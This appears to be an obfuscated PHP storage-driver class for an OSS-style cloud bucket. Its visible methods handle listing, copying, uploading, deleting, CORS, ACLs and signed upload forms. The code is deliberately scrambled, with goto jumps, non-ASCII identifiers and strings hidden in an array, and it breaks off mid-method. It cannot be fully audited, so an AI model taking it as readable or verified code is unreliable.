<?php
 goto bÌŞÁù›”È; AêÚ“ ÚÛ˜: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Íºüí°Ä) { parent::__construct(); include_once SDK_DIR . $_SERVER[•Ùç É][1422]; $this->_init($Íºüí°Ä); } public function _init($•©ĞÍëŸ) { $Ú¯ö¢¸Û =& $_SERVER[•Ùç É]; $this->config = $•©ĞÍëŸ; foreach ($•©ĞÍëŸ as $µ§Èå»È => $¥È¿Ôû) { if (isset($this->{$µ§Èå»È})) { $this->{$µ§Èå»È} = $¥È¿Ôû; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ú¯ö¢¸Û[1423] . LNG($Ú¯ö¢¸Û[1424])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $îß…¾ =& $_SERVER[•Ùç É]; $¾õ¦•”Ä = new OSS\Model\CorsConfig(); $ö¤éíŠˆ = new OSS\Model\CorsRule(); $ö¤éíŠˆ->addAllowedOrigin($îß…¾[1425]); $ö¤éíŠˆ->addAllowedMethod($îß…¾[1426]); $ö¤éíŠˆ->addAllowedMethod($îß…¾[1427]); $ö¤éíŠˆ->addAllowedMethod($îß…¾[1428]); $ö¤éíŠˆ->addAllowedMethod($îß…¾[1429]); $ö¤éíŠˆ->addAllowedMethod($îß…¾[163]); $ö¤éíŠˆ->setMaxAgeSeconds(600); $ö¤éíŠˆ->addExposeHeader($îß…¾[1430]); $ö¤éíŠˆ->addAllowedHeader($îß…¾[1425]); $¾õ¦•”Ä->addRule($ö¤éíŠˆ); try { $this->client->putBucketCors($this->bucket, $¾õ¦•”Ä); } catch (OSS\Core\OssException $æÍ·Üñ–) { return !1; } return !0; } public function getBucketCors() { $ËÙÛ‚·Ê =& $_SERVER[•Ùç É]; $‚¨ºù® = null; try { $‚¨ºù® = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $™â—’Ë‘) { return null; } if (!$‚¨ºù® || !($”ĞØÜ¼ = $‚¨ºù®->getRules())) { return null; } $îùÙ¥è‡ = $”ĞØÜ¼[0]->getAllowedOrigins(); $îâšèÇø = $”ĞØÜ¼[0]->getAllowedMethods(); $Ğùåµ½ = $”ĞØÜ¼[0]->getMaxAgeSeconds(); $ÚåÄ˜Í = $”ĞØÜ¼[0]->getExposeHeaders(); $ïÅ¸™‰° = $”ĞØÜ¼[0]->getAllowedHeaders(); return array($ËÙÛ‚·Ê[204] => isset($îùÙ¥è‡[0]) ? $îùÙ¥è‡[0] : $ËÙÛ‚·Ê[12], $ËÙÛ‚·Ê[208] => $îâšèÇø, $ËÙÛ‚·Ê[1431] => $Ğùåµ½, $ËÙÛ‚·Ê[1432] => isset($ÚåÄ˜Í[0]) ? $ÚåÄ˜Í[0] : $ËÙÛ‚·Ê[12], $ËÙÛ‚·Ê[206] => isset($ïÅ¸™‰°[0]) ? $ïÅ¸™‰°[0] : $ËÙÛ‚·Ê[12]); } public function isBucketCors() { $¬ƒğëô =& $_SERVER[•Ùç É]; $««‚¢¨ = $this->getBucketCors(); if (!$««‚¢¨ || !is_array($««‚¢¨)) { return !1; } if ($««‚¢¨[$¬ƒğëô[204]] != $¬ƒğëô[205] || $««‚¢¨[$¬ƒğëô[206]] != $¬ƒğëô[205]) { return !1; } $º•†‹÷Ê = array_map($¬ƒğëô[207], $««‚¢¨[$¬ƒğëô[208]]); if (!is_array($º•†‹÷Ê)) { $º•†‹÷Ê = array(); } $š€€²œÃ = array($¬ƒğëô[209], $¬ƒğëô[210], $¬ƒğëô[211], $¬ƒğëô[212], $¬ƒğëô[213]); $é—›º€ƒ = array_diff($š€€²œÃ, $º•†‹÷Ê); return empty($é—›º€ƒ); } public function mkfile($µ´Ñ»Ö½, $›Áı¯°‡ = '', $¯éµ¶×³ = REPEAT_RENAME) { $Æêì‹µù = $this->setContent($µ´Ñ»Ö½, $›Áı¯°‡); if ($Æêì‹µù !== !1) { return $this->getPathOuter($µ´Ñ»Ö½); } return !1; } public function mkdir($íÉ¯‡†´, $ó Éö“¥ = REPEAT_SKIP) { if ($ó Éö“¥ && $this->_isFolder($íÉ¯‡†´)) { return $this->getPathOuter($íÉ¯‡†´); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($íÉ¯‡†´)); } catch (OSS\Core\OssException $†Â¹Ó“) { return !1; } return $this->getPathOuter($íÉ¯‡†´); } private function fileList($¿Â³ò÷, $”§¶Ş = '', $±öŒƒÕ‰ = 0) { $ñäÈàîÓ =& $_SERVER[•Ùç É]; $¿Â³ò÷ = trim($¿Â³ò÷, $ñäÈàîÓ[8]); $İµ÷ÚÆ¢ = empty($¿Â³ò÷) && $¿Â³ò÷ !== $ñäÈàîÓ[214] ? $ñäÈàîÓ[12] : $¿Â³ò÷ . $ñäÈàîÓ[8]; $¸ã‹½û¹ = $ñäÈàîÓ[12]; $‰ğ¤•ÛÍ = 1000; $«ËéŞ¬ = $ïƒñ¸·Ä = array(); while (!0) { check_abort(); $•»³“Çğ = array($ñäÈàîÓ[1433] => $”§¶Ş, $ñäÈàîÓ[1434] => $İµ÷ÚÆ¢, $ñäÈàîÓ[1435] => $‰ğ¤•ÛÍ, $ñäÈàîÓ[1436] => $¸ã‹½û¹); try { $Ãë¿Öª = $this->client->listObjects($this->bucket, $•»³“Çğ); } catch (OSS\Core\OssException $óí—¨ë) { break; } $¸ã‹½û¹ = $Ãë¿Öª->getNextMarker(); $´¿ü¥‘— = $Ãë¿Öª->getObjectList(); $˜˜Ğ§ÁŠ = $Ãë¿Öª->getPrefixList(); foreach ($´¿ü¥‘— as $«ÓÒÀ×) { if ($«ÓÒÀ×->getKey() == $İµ÷ÚÆ¢) { continue; } $ÍéÔì« = $«ÓÒÀ×->getKey(); $Ú»¬îş = $«ÓÒÀ×->getSize(); $ºÏÓ™ğ = $«ÓÒÀ×->getLastModified(); $½ôıíÒÍ = trim($«ÓÒÀ×->getETag(), $ñäÈàîÓ[120]); $Ï¸” … = $±öŒƒÕ‰ ? array($ñäÈàîÓ[32] => $ÍéÔì«, $ñäÈàîÓ[78] => $Ú»¬îş, $ñäÈàîÓ[196] => strtotime($ºÏÓ™ğ), $ñäÈàîÓ[1437] => $½ôıíÒÍ) : $ÍéÔì«; $ßâ¨Î‚‡ = $Ú»¬îş == 0 && substr($ÍéÔì«, strlen($ÍéÔì«) - 1, 1) == $ñäÈàîÓ[8] ? !0 : !1; $ƒØûìª˜ = array($ñäÈàîÓ[78] => $Ú»¬îş, $ñäÈàîÓ[1438] => $Ú»¬îş, $ñäÈàîÓ[87] => strtotime($ºÏÓ™ğ), $ñäÈàîÓ[1439] => $ºÏÓ™ğ, $ñäÈàîÓ[1437] => $½ôıíÒÍ); $this->cacheMethodInfoSet($ÍéÔì«, $ßâ¨Î‚‡, $ƒØûìª˜); if ($ßâ¨Î‚‡) { $«ËéŞ¬[] = $ÍéÔì«; continue; } $ïƒñ¸·Ä[] = $Ï¸” …; } foreach ($˜˜Ğ§ÁŠ as $ÀÄãŒµù) { $«ËéŞ¬[] = $ÀÄãŒµù->getPrefix(); $this->cacheMethodInfoSet($ÀÄãŒµù->getPrefix(), !0); } if ($¸ã‹½û¹ === $ñäÈàîÓ[12]) { break; } } $this->cacheMethodInfoSet($¿Â³ò÷, !0); return array($ñäÈàîÓ[84] => $«ËéŞ¬, $ñäÈàîÓ[85] => $ïƒñ¸·Ä); } public function copyFile($ÕÔÈ¡Éè, $†×ŞÄëà) { $Æµéğ»İ = $this->size($ÕÔÈ¡Éè); if ($Æµéğ»İ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÕÔÈ¡Éè, $this->bucket, $this->pathEncode($†×ŞÄëà)); } catch (OSS\Core\OssException $‰§ƒ÷ú) { return !1; } return $this->getPathOuter($†×ŞÄëà); } $¬¹ûñ¤ç = $this->multiCopyObject($ÕÔÈ¡Éè, $†×ŞÄëà, $Æµéğ»İ); return $¬¹ûñ¤ç ? $this->getPathOuter($†×ŞÄëà) : !1; } private function multiCopyObject($âšíšÙ˜, $Ë ¢Î‚Ó, $¸¢´½…) { $áÛşĞôŒ =& $_SERVER[•Ùç É]; try { $œ‘’–¶ş = array(); if ($Ô÷Œõµ“ = $this->hashMd5($âšíšÙ˜)) { $œ‘’–¶ş = array(OSS\OssClient::OSS_HEADERS => array($áÛşĞôŒ[1440] => $Ô÷Œõµ“)); } $ê“–‘ü‹ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ë ¢Î‚Ó), $œ‘’–¶ş); $É°Ğ•ß˜ = 1; $Ò­™Ÿ›¤ = 0; $×½©ó¨Ã = array(); $ãšÅ¶á¹ = 1024 * 1024 * 10; $¿œûØÉó = $this->client->generateMultiuploadParts($¸¢´½…, $ãšÅ¶á¹); foreach ($¿œûØÉó as $æŒíÖ¶Ü => $Â›•¤ô£) { $ö±Ê±Ü = $Ò­™Ÿ›¤ + (int) $Â›•¤ô£[$áÛşĞôŒ[1441]]; $Ñè…ÏÑ = (int) $Â›•¤ô£[$áÛşĞôŒ[383]] + $ö±Ê±Ü - 1; $¥»ãÎíö = array($áÛşĞôŒ[1442] => $ö±Ê±Ü, $áÛşĞôŒ[1443] => $Ñè…ÏÑ); $×½©ó¨Ã[] = $this->client->uploadPartCopy($this->bucket, $âšíšÙ˜, $this->bucket, $this->pathEncode($Ë ¢Î‚Ó), $É°Ğ•ß˜, $ê“–‘ü‹, $¥»ãÎíö); $É°Ğ•ß˜ = $É°Ğ•ß˜ + 1; } $è¢„ôÉÑ = array(); foreach ($×½©ó¨Ã as $æŒíÖ¶Ü => $ŠÏ·Ö®“) { $è¢„ôÉÑ[] = array($áÛşĞôŒ[1444] => $æŒíÖ¶Ü + 1, $áÛşĞôŒ[1445] => $ŠÏ·Ö®“); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ë ¢Î‚Ó), $ê“–‘ü‹, $è¢„ôÉÑ); } catch (OSS\Core\OssException $²º çø) { return !1; } return !0; } public function moveFile($ÇıÈ«Ş², $½ØÅğ») { if ($this->copyFile($ÇıÈ«Ş², $½ØÅğ»)) { $this->remove($ÇıÈ«Ş²); return $this->getPathOuter($½ØÅğ»); } return !1; } public function delFile($ÎÜ¿øÓæ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÎÜ¿øÓæ)); } catch (OSS\Core\OssException $ÏúŠúÅ) { return !1; } return !0; } public function delFolder($´îãÚ) { $ğÓâµı© =& $_SERVER[•Ùç É]; if (!$this->exist($´îãÚ)) { return !0; } $this->listItemCache = !1; $Òáçñ×¨ = $this->fileList($´îãÚ); $this->listItemCache = !0; $ÉõĞ‡Ğ¶ = trim($´îãÚ, $ğÓâµı©[8]) . $ğÓâµı©[8]; if (!empty($´îãÚ) && $´îãÚ !== $ğÓâµı©[214] && !in_array($ÉõĞ‡Ğ¶, $Òáçñ×¨[$ğÓâµı©[84]])) { $Òáçñ×¨[$ğÓâµı©[84]][] = $ÉõĞ‡Ğ¶; } $®ÖÊÚÕ• = $this->delByBatch($Òáçñ×¨[$ğÓâµı©[85]]); if (!$®ÖÊÚÕ•) { return !1; } $®ÖÊÚÕ• = $this->delByBatch($Òáçñ×¨[$ğÓâµı©[84]]); if (!$®ÖÊÚÕ•) { return !1; } return $this->delFile($ÉõĞ‡Ğ¶); } private function delByBatch($¸°­ÒÊ) { foreach (array_chunk($¸°­ÒÊ, 1000) as $ñşÏÀ±) { try { $this->client->deleteObjects($this->bucket, $ñşÏÀ±); } catch (OSS\Core\OssException $©òÚÄàı) { return !1; } } return !0; } public function rename($î¯¯Ê¨Ø, $ÛÛ’ìŒ) { return $this->renameObject($î¯¯Ê¨Ø, $ÛÛ’ìŒ); } private function fileInfo($½´â€§¹, $šÜ§òÓˆ = false, $àÙ½ = array()) { $«Ò­„ =& $_SERVER[•Ùç É]; $ıÑİ½ı = array($«Ò­„[32] => $this->pathThis($½´â€§¹), $«Ò­„[86] => $this->getPathOuter($½´â€§¹), $«Ò­„[33] => $«Ò­„[216], $«Ò­„[78] => isset($àÙ½[$«Ò­„[78]]) ? $àÙ½[$«Ò­„[78]] : 0, $«Ò­„[177] => $this->ext($½´â€§¹)); if ($šÜ§òÓˆ) { return $ıÑİ½ı; } $ıÑİ½ı[$«Ò­„[217]] = $ıÑİ½ı[$«Ò­„[87]] = 0; $ıÑİ½ı[$«Ò­„[218]] = $ıÑİ½ı[$«Ò­„[219]] = !0; if (empty($àÙ½)) { $ªÈñ•ã‚ = $this->objectMeta($½´â€§¹); if (!$ªÈñ•ã‚) { return $ıÑİ½ı; } $àÙ½ = array($«Ò­„[87] => strtotime($ªÈñ•ã‚[$«Ò­„[1439]]), $«Ò­„[78] => $ªÈñ•ã‚[$«Ò­„[1438]] + 0, $«Ò­„[1437] => $ªÈñ•ã‚[$«Ò­„[1437]]); } if (isset($àÙ½[$«Ò­„[1437]]) && $àÙ½[$«Ò­„[1437]]) { $ıÑİ½ı[$«Ò­„[221]] = trim($àÙ½[$«Ò­„[1437]], $«Ò­„[120]); } if (isset($àÙ½[$«Ò­„[78]])) { $ıÑİ½ı[$«Ò­„[78]] = $àÙ½[$«Ò­„[78]]; } if (isset($àÙ½[$«Ò­„[87]])) { $ıÑİ½ı[$«Ò­„[87]] = $àÙ½[$«Ò­„[87]]; } if (isset($àÙ½[$«Ò­„[196]]) && !trim($ıÑİ½ı[$«Ò­„[87]])) { $ıÑİ½ı[$«Ò­„[87]] = $àÙ½[$«Ò­„[196]]; } return $ıÑİ½ı; } private function folderInfo($Ù…€Ôğá, $®«Ú½À­ = false, $©†Ãş¨› = array()) { $öİÙ ò´ =& $_SERVER[•Ùç É]; $¾£Ú¹Í = array($öİÙ ò´[32] => $this->pathThis($Ù…€Ôğá), $öİÙ ò´[86] => $this->getPathOuter($öİÙ ò´[8] . $Ù…€Ôğá), $öİÙ ò´[33] => $öİÙ ò´[77]); if ($®«Ú½À­) { return $¾£Ú¹Í; } $¾£Ú¹Í[$öİÙ ò´[217]] = $¾£Ú¹Í[$öİÙ ò´[87]] = 0; $¾£Ú¹Í[$öİÙ ò´[218]] = $¾£Ú¹Í[$öİÙ ò´[219]] = !0; if (empty($©†Ãş¨›)) { $Ù…€Ôğá = rtrim($Ù…€Ôğá, $öİÙ ò´[8]) . $öİÙ ò´[8]; $à—¸Ò± = $this->objectMeta($Ù…€Ôğá); if (!$à—¸Ò±) { return $¾£Ú¹Í; } $©†Ãş¨› = array($öİÙ ò´[217] => $à—¸Ò±[$öİÙ ò´[546]][$öİÙ ò´[1446]], $öİÙ ò´[87] => strtotime($à—¸Ò±[$öİÙ ò´[1439]])); } if (isset($©†Ãş¨›[$öİÙ ò´[87]])) { $¾£Ú¹Í[$öİÙ ò´[87]] = $©†Ãş¨›[$öİÙ ò´[87]]; } if (isset($©†Ãş¨›[$öİÙ ò´[217]])) { $¾£Ú¹Í[$öİÙ ò´[217]] = $©†Ãş¨›[$öİÙ ò´[217]]; } return $¾£Ú¹Í; } public function listPath($ã¯ßúúï, $…û…èŒË = false) { $àãÁ×‚Á =& $_SERVER[•Ùç É]; $²Á³ìº“ = $this->fileList($ã¯ßúúï, $àãÁ×‚Á[8], !0); foreach ($²Á³ìº“[$àãÁ×‚Á[84]] as $ñ¾ı‡Ğ => $Â¸õüß) { $²Á³ìº“[$àãÁ×‚Á[84]][$ñ¾ı‡Ğ] = $this->folderInfo($Â¸õüß, $…û…èŒË, $Â¸õüß); } foreach ($²Á³ìº“[$àãÁ×‚Á[85]] as $ñ¾ı‡Ğ => $Â¸õüß) { $²Á³ìº“[$àãÁ×‚Á[85]][$ñ¾ı‡Ğ] = $this->fileInfo($Â¸õüß[$àãÁ×‚Á[32]], $…û…èŒË, $Â¸õüß); } return $²Á³ìº“; } protected function infoChildren($‘ğ‡ùÖ, &$ÈçÌƒ’ñ) { $¶ñ Ÿ¬† =& $_SERVER[•Ùç É]; $œÛ“Ó÷ = $this->fileList($‘ğ‡ùÖ, $¶ñ Ÿ¬†[12], !0); $ÈçÌƒ’ñ[$¶ñ Ÿ¬†[80]] += count($œÛ“Ó÷[$¶ñ Ÿ¬†[84]]); $ÈçÌƒ’ñ[$¶ñ Ÿ¬†[79]] += count($œÛ“Ó÷[$¶ñ Ÿ¬†[85]]); foreach ($œÛ“Ó÷[$¶ñ Ÿ¬†[85]] as $Ïö’¾«‘) { if (!$Ïö’¾«‘ || !$Ïö’¾«‘[$¶ñ Ÿ¬†[78]]) { continue; } $ÈçÌƒ’ñ[$¶ñ Ÿ¬†[78]] += $Ïö’¾«‘[$¶ñ Ÿ¬†[78]]; } } public function has($ËÚˆ¾ˆ¬, $«‰Üì¥­ = false, $Ïˆê¿÷¯ = true) { $ó›Ô–ĞÂ =& $_SERVER[•Ùç É]; $ËÚˆ¾ˆ¬ = trim($ËÚˆ¾ˆ¬, $ó›Ô–ĞÂ[8]); $ø¢©Ééã = empty($ËÚˆ¾ˆ¬) && $ËÚˆ¾ˆ¬ !== $ó›Ô–ĞÂ[214] ? $ó›Ô–ĞÂ[12] : $ËÚˆ¾ˆ¬ . $ó›Ô–ĞÂ[8]; $†‰ú­çô = $ó›Ô–ĞÂ[12]; $›¼øÁ¯å = 500; $ÅŒİİ÷œ = $§ö¶¯ÌÑ = 0; while (!0) { check_abort(); $›¯øƒ› = array($ó›Ô–ĞÂ[1433] => $ó›Ô–ĞÂ[8], $ó›Ô–ĞÂ[1434] => $ø¢©Ééã, $ó›Ô–ĞÂ[1435] => $›¼øÁ¯å, $ó›Ô–ĞÂ[1436] => $†‰ú­çô); try { $À‡Œ¤Õ = $this->client->listObjects($this->bucket, $›¯øƒ›); } catch (OSS\Core\OssException $Ë÷ßÁˆ¹) { break; } $†‰ú­çô = $À‡Œ¤Õ->getNextMarker(); $ÅŞá¯¢ = $À‡Œ¤Õ->getObjectList(); $¹û„ƒÎ± = $À‡Œ¤Õ->getPrefixList(); if ($«‰Üì¥­) { if (count($ÅŞá¯¢) > 1 || count($ÅŞá¯¢) == 1 && $ÅŞá¯¢[0]->getKey() != $ø¢©Ééã) { $ÅŒİİ÷œ += count($ÅŞá¯¢) - 1; } if (!empty($¹û„ƒÎ±)) { $§ö¶¯ÌÑ += count($¹û„ƒÎ±); } if ($†‰ú­çô === $ó›Ô–ĞÂ[12]) { break; } continue; } if ($Ïˆê¿÷¯) { if (!empty($ÅŞá¯¢)) { if (count($ÅŞá¯¢) > 1 || $ÅŞá¯¢[0]->getKey() != $ø¢©Ééã) { return !0; } } } else { if (!empty($¹û„ƒÎ±)) { return !0; } } if ($†‰ú­çô === $ó›Ô–ĞÂ[12]) { break; } } if ($«‰Üì¥­) { return array($ó›Ô–ĞÂ[225] => $ÅŒİİ÷œ, $ó›Ô–ĞÂ[226] => $§ö¶¯ÌÑ); } return !1; } public function listAll($¤ƒ¨Ÿ·) { $À¼š¶õÃ =& $_SERVER[•Ùç É]; $Àµ¦–ì› = $this->fileList($¤ƒ¨Ÿ·, $À¼š¶õÃ[12], !0); $ÂğÃÈ³ = array_to_keyvalue($Àµ¦–ì›[$À¼š¶õÃ[85]], $À¼š¶õÃ[32]); foreach ($Àµ¦–ì›[$À¼š¶õÃ[84]] as $Ûİ÷»æ) { if (is_string($Ûİ÷»æ)) { $ÂğÃÈ³[$Ûİ÷»æ] = array($À¼š¶õÃ[78] => 0); } } return $this->listAllFiles($¤ƒ¨Ÿ·, $ÂğÃÈ³); } public function canRead($¥Ì¼ÁË¬) { $şÃ³Ü‡¨ =& $_SERVER[•Ùç É]; $‰ÓÁÑŒ = $this->pathAcl($¥Ì¼ÁË¬); return $‰ÓÁÑŒ == $şÃ³Ü‡¨[1447] || $‰ÓÁÑŒ == $şÃ³Ü‡¨[589] ? !0 : !1; } public function canWrite($ø¯µÚâ) { $³¦§¨Š” = $this->pathAcl($ø¯µÚâ); return $³¦§¨Š” == $_SERVER[•Ùç É][589] ? !0 : !1; } public function pathAcl($ìÇ×ğ¤) { $ÌÅ¶úĞ =& $_SERVER[•Ùç É]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $‚ê²Œ­œ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ìÇ×ğ¤)); } catch (OSS\Core\OssException $Ç°•†) { return !1; } $¼¹¢£¡” = $‚ê²Œ­œ == $ÌÅ¶úĞ[37] ? $this->bucketAcl : $‚ê²Œ­œ; if ($¼¹¢£¡” == $ÌÅ¶úĞ[1448]) { return $ÌÅ¶úĞ[1447]; } if ($¼¹¢£¡” == $ÌÅ¶úĞ[1449]) { return $ÌÅ¶úĞ[589]; } return $¼¹¢£¡”; } private function chmodPath($â¥øËñ, $äÊşâ¦– = '') { $áò¨ÑÙØ =& $_SERVER[•Ùç É]; $”¨—»Ÿ = empty($äÊşâ¦–) ? $áò¨ÑÙØ[1449] : $äÊşâ¦–; $Û³¶”Ñ = array($áò¨ÑÙØ[37], $áò¨ÑÙØ[215], $áò¨ÑÙØ[1448], $áò¨ÑÙØ[1449]); if (!in_array($”¨—»Ÿ, $Û³¶”Ñ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($â¥øËñ), $”¨—»Ÿ); } catch (OSS\Core\OssException $ò¡ç£Ç®) { return !1; } return !0; } public function getContent($÷çÕ×š¿) { return $this->fileSubstr($÷çÕ×š¿, -1); } public function setContent($ÙˆÃÛä, $¾°¦‘É´ = '') { $¾€¡şá =& $_SERVER[•Ùç É]; try { $ì†ı—Æ = $this->trafficLimit($¾€¡şá[1450]); $ŠûåÁ²˜ = $this->client->putObject($this->bucket, $this->pathEncode($ÙˆÃÛä), $¾°¦‘É´, $ì†ı—Æ); } catch (OSS\Core\OssException $–¸êŞØœ) { return !1; } $¾¹”“®¨ = array($¾€¡şá[1440] => trim($ŠûåÁ²˜[$¾€¡şá[1437]], $¾€¡şá[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÙˆÃÛä))); $this->updateObjMeta($ÙˆÃÛä, $¾¹”“®¨); return isset($ŠûåÁ²˜[$¾€¡şá[1451]][$¾€¡şá[277]]) ? !0 : !1; } private function updateObjMeta($õ­¬½ı, $ÑŒ ŞïÜ) { $õ­¬½ı = $this->pathEncode($õ­¬½ı); try { $åØÄí™ô = array(OSS\OssClient::OSS_HEADERS => $ÑŒ ŞïÜ); $this->client->copyObject($this->bucket, $õ­¬½ı, $this->bucket, $õ­¬½ı, $åØÄí™ô); } catch (OSS\Core\OssException $šóƒöªÀ) { return !1; } return !0; } public function upload($Àš•¸Çò, $€˜ş¬ë‰, $ä¼Ûôçê = false, $ÌıëÊŞ = REPEAT_REPLACE) { $¦œ«®ê =& $_SERVER[•Ùç É]; $Öî¶« = trim($Àš•¸Çò, $¦œ«®ê[8]); $´±Ëë = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¦œ«®ê[1440] => @md5_file($€˜ş¬ë‰)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Àš•¸Çò))); $´±Ëë = $this->trafficLimit($¦œ«®ê[1450], $´±Ëë); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Öî¶«), $€˜ş¬ë‰, $´±Ëë); } catch (OSS\Core\OssException $¹òø‚Š) { return !1; } return $this->getPathOuter($Àš•¸Çò); } public function getHost() { $Á…äıèÁ =& $_SERVER[•Ùç É]; $–°³ú“ = explode($Á…äıèÁ[200], parent::getHost()); return $–°³ú“[0] . $Á…äıèÁ[200] . $this->bucket . $Á…äıèÁ[10] . $–°³ú“[1]; } public function uploadFormData($†»Ò„üò, $¹÷á¸Ï = 3600) { $Ò³°‘¹© =& $_SERVER[•Ùç É]; if (!($‹êàÎö™ = $this->getHost())) { return !1; } $¬†°ˆÙ = $¹÷á¸Ï; $Ü»±Ñ×ğ = date($Ò³°‘¹©[1452], time() + $¬†°ˆÙ); $íÏ¡Å = new DateTime($Ü»±Ñ×ğ); $¿§¯©”å = $íÏ¡Å->format(DateTime::ISO8601); $Íá¨öªé = strpos($¿§¯©”å, $Ò³°‘¹©[342]); $¿§¯©”å = substr($¿§¯©”å, 0, $Íá¨öªé) . $Ò³°‘¹©[1453]; $èïûŒı = 1048576000 * 5; $æ¯™³ˆ = $this->pathFather($†»Ò„üò); $ÈÇÅ¾°ì = array($Ò³°‘¹©[260] => $¿§¯©”å, $Ò³°‘¹©[263] => array(array($Ò³°‘¹©[1454], 0, $èïûŒı), array($Ò³°‘¹©[266], $Ò³°‘¹©[267], $æ¯™³ˆ))); $­¾ç—‚¼ = base64_encode(json_encode($ÈÇÅ¾°ì)); $ö­Ë°õ = base64_encode(hash_hmac($Ò³°‘¹©[249], $­¾ç—‚¼, $this->secret, !0)); $Õãá˜í = array($Ò³°‘¹©[278] => $­¾ç—‚¼, $Ò³°‘¹©[1455] => $this->accessKey, $Ò³°‘¹©[270] => $Ò³°‘¹©[259], $Ò³°‘¹©[1456] => $ö­Ë°õ, $Ò³°‘¹©[198] => $‹êàÎö™); $Õãá˜í = $this->trafficLimit($Ò³°‘¹©[1450], $Õãá˜í); return $Õãá˜í; } public function multiUploadFormData($úÆœ§ó, $ÆÌç“¶ò = 3600) { $»é­¤ó =& $_SERVER[•Ùç É]; if (!($Í£å”ªü = $this->getHost())) { return !1; } $¶ıè‹½¯ = $this->trafficLimit($»é­¤ó[1450]); $­Ë¹¦ş· = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($úÆœ§ó), $¶ıè‹½¯); return array($»é­¤ó[240] => $­Ë¹¦ş·, $»é­¤ó[198] => $Í£å”ªü . $»é­¤ó[8] . $this->pathEncode($úÆœ§ó), $»é­¤ó[241] => gmdate($»é­¤ó[1457]), $»é­¤ó[96] => $úÆœ§ó); } public function multiUploadAuthData($¤³®Ì÷¯, $Âé€íÈ¤ = array()) { $ì˜®¦¦ş =& $_SERVER[•Ùç É]; $À²î¼ÕÎ = isset($Âé€íÈ¤[$ì˜®¦¦ş[241]]) ? $Âé€íÈ¤[$ì˜®¦¦ş[241]] : gmdate($ì˜®¦¦ş[1457]); $¶Š—Ù­£ = isset($Âé€íÈ¤[$ì˜®¦¦ş[177]]) ? $Âé€íÈ¤[$ì˜®¦¦ş[177]] : $ì˜®¦¦ş[12]; $¸Ü²¾ÕÔ = $¤³®Ì÷¯; if (isset($Âé€íÈ¤[$ì˜®¦¦ş[96]])) { $¸Ü²¾ÕÔ = $Âé€íÈ¤[$ì˜®¦¦ş[96]]; unset($Âé€íÈ¤[$ì˜®¦¦ş[96]]); } if (isset($Âé€íÈ¤[$ì˜®¦¦ş[242]])) { $Âé€íÈ¤[$ì˜®¦¦ş[241]] = $À²î¼ÕÎ; return $this->listUploadParts($¸Ü²¾ÕÔ, $Âé€íÈ¤); } $¡ÓŸ = array($ì˜®¦¦ş[243], $ì˜®¦¦ş[12], $ì˜®¦¦ş[122], $À²î¼ÕÎ, "\x78\x2d\x6f\x73\x73\55\x64\141\164\145\72{$À²î¼ÕÎ}", $ì˜®¦¦ş[8] . $this->bucket . $ì˜®¦¦ş[8] . $¸Ü²¾ÕÔ . $¶Š—Ù­£); if (strpos($¶Š—Ù­£, $ì˜®¦¦ş[244]) === 0) { $¡ÓŸ[0] = $ì˜®¦¦ş[245]; if ($†æÉ†’ = $this->trafficLimit($ì˜®¦¦ş[1450])) { $¸Ü²¾ÕÔ = $ì˜®¦¦ş[1458]; array_splice($¡ÓŸ, 5, 0, $¸Ü²¾ÕÔ . $ì˜®¦¦ş[4] . $†æÉ†’[$¸Ü²¾ÕÔ]); } } if (isset($Âé€íÈ¤[$ì˜®¦¦ş[246]]) && $Âé€íÈ¤[$ì˜®¦¦ş[246]] == $ì˜®¦¦ş[247]) { $¡ÓŸ[0] = $ì˜®¦¦ş[247]; } if (!empty($Âé€íÈ¤[$ì˜®¦¦ş[1459]])) { $ÄÄ×Ãã€ = array_merge(array($¡ÓŸ[4]), $Âé€íÈ¤[$ì˜®¦¦ş[1459]]); sort($ÄÄ×Ãã€); $¡ÓŸ[4] = implode($ì˜®¦¦ş[248], $ÄÄ×Ãã€); } $å°İ¼ÎÙ = implode($ì˜®¦¦ş[248], $¡ÓŸ); $Ú¹°Óä = base64_encode(hash_hmac($ì˜®¦¦ş[249], $å°İ¼ÎÙ, $this->secret, !0)); $éøÍÕÚ© = $ì˜®¦¦ş[1423] . $this->accessKey . $ì˜®¦¦ş[4] . $Ú¹°Óä; if (strpos($¶Š—Ù­£, $ì˜®¦¦ş[244]) === 0) { $éøÍÕÚ© = array($ì˜®¦¦ş[251] => $éøÍÕÚ©, $ì˜®¦¦ş[241] => $À²î¼ÕÎ); if ($†æÉ†’) { $éøÍÕÚ© = array_merge($éøÍÕÚ©, $†æÉ†’); } } return $éøÍÕÚ©; } public function listUploadParts($‚¬è¾å–, $†´›—š) { $ğßÜ¼ì =& $_SERVER[•Ùç É]; $ó°Ğğ˜Æ = parse_url_query($†´›—š[$ğßÜ¼ì[177]]); $Œİ•ßÔª = $this->client->listParts($this->bucket, $this->pathEncode($‚¬è¾å–), $ó°Ğğ˜Æ[$ğßÜ¼ì[240]]); $üú“ƒø = $Œİ•ßÔª->getListPart(); $€Ø‘Öè† = array(); foreach ($üú“ƒø as $ıï¥©ìş) { $€Ø‘Öè†[] = array($ğßÜ¼ì[1444] => $ıï¥©ìş->getPartNumber(), $ğßÜ¼ì[1445] 